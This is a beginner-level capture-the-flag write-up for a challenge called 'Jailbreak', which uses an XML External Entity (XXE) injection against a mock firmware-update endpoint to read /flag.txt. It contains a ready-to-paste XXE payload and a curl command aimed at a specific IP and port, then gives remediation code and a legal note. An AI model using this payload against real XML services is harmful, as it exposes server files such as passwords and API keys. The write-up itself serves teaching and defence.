# Jailbreak — Super Beginner-Friendly Writeup

**Challenge name:** Jailbreak
**Points:** 900

---

## 🧠 What this challenge is about

You are given a fake “firmware update” service that reads XML files. The goal is to find a way to make it **leak the contents of a secret file** called `/flag.txt` on the server.

You can do this using an XML trick called **XXE (XML External Entity)**.

---

## 🧩 What’s happening (in very simple terms)

XML lets you define *entities* — placeholders that can stand for text or files.
If a server is not careful, an attacker can say:

> “Hey XML parser, please read this file and put it right here.”

And the server will do it! 😱

That’s what we do in this challenge.

We’ll define an entity that points to the flag file: `file:///flag.txt`.
Then we’ll insert that entity in the XML, and when the server reads the XML, it will replace it with the flag.

---

## 📘 Quick explanation of terms

| Term        | What it means                                                                    |
| ----------- | -------------------------------------------------------------------------------- |
| **XML**     | A structured way to send data, like HTML but for data.                           |
| **DOCTYPE** | A section at the top of XML that defines custom shortcuts (entities).            |
| **ENTITY**  | A shortcut that can hold text or a file’s contents.                              |
| **XXE**     | When a hacker uses an ENTITY to make the server read files or data it shouldn’t. |

---

## 🪄 Step-by-step guide

1. The server has an endpoint `/api/update` that accepts XML input.
2. We send XML that defines an ENTITY named `xxe`, which points to `/flag.txt`.
3. We use `&xxe;` inside the XML. The `&xxe;` part gets replaced with whatever is inside `/flag.txt`.
4. The server then returns the parsed XML — including the flag!

---

## 🧾 The XML payload (copy this)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>1.33.7&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <Description>Update test</Description>
  </Firmware>
</FirmwareUpdateConfig>
```

### 💡 How it works

* The line `<!ENTITY xxe SYSTEM "file:///flag.txt">` tells the parser: “The entity `xxe` means the contents of `/flag.txt`.”
* The part `&xxe;` means “insert that entity here.”
* So the parser will replace `&xxe;` with whatever is in `/flag.txt`.

Example:

```xml
<Version>1.33.7FLAG{super_secret_flag}</Version>
```

---

## 💻 Example using `curl`

Open your Terminal (on Mac/Linux) or PowerShell (on Windows) and paste this command:

```bash
curl -s -X POST 'http://94.237.57.211:57541/api/update' \
  -H 'Content-Type: application/xml' \
  --data-binary $'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt">]>\n<FirmwareUpdateConfig>\n  <Firmware>\n    <Version>1.33.7&xxe;</Version>\n  </Firmware>\n</FirmwareUpdateConfig>'
```

After pressing **Enter**, look at the output.
If it worked, you’ll see something like this:

```
<Response>
  <Version>1.33.7FLAG{this_is_the_flag}</Version>
</Response>
```

🎉 The flag is `FLAG{this_is_the_flag}`!

---

## 👀 What you should see

Look for a string that looks like `FLAG{something}`.
That’s your flag. Copy it and submit it on the CTF site.

If you don’t see anything, make sure:

* You sent to the **right IP and port**.
* You used **Content-Type: application/xml**.
* You copied the payload exactly.

---

## ⚠️ Why this works (and why it’s dangerous)

* The server’s XML parser is **too trusting**.
* It allows `DOCTYPE` and `ENTITY` processing.
* So you can make it read files on the server (like `/flag.txt`).

In the real world, this could leak passwords, config files, or API keys.

---

## 🔧 How to fix this (for developers)

**Don’t let XML parsers read external entities!**

Examples:

**Python (safe parsing)**

```python
from defusedxml.ElementTree import fromstring
xml_data = fromstring(xml_input)  # safe parser, blocks XXE
```

**Java (disable DTD)**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Or use **JSON** instead of XML when possible.

---

## 🪶 Quick recap

✅ XML parser reads files if misconfigured
✅ `<!ENTITY xxe SYSTEM "file:///flag.txt">` defines a file reference
✅ `&xxe;` inserts the file contents into XML
✅ Server returns that → you get the flag

---

## 🚫 Legal note

This technique is for **educational and CTF use only**.
Never test real websites or systems without permission.

---

## ✨ Summary for beginners

| Step | What you do                    | Why it matters                      |
| ---- | ------------------------------ | ----------------------------------- |
| 1    | Create XML payload with ENTITY | Tells XML parser to read a file     |
| 2    | Send to `/api/update` endpoint | The server parses it                |
| 3    | Parser replaces `&xxe;`        | You get the contents of `/flag.txt` |
| 4    | Look for `FLAG{                |                                     |
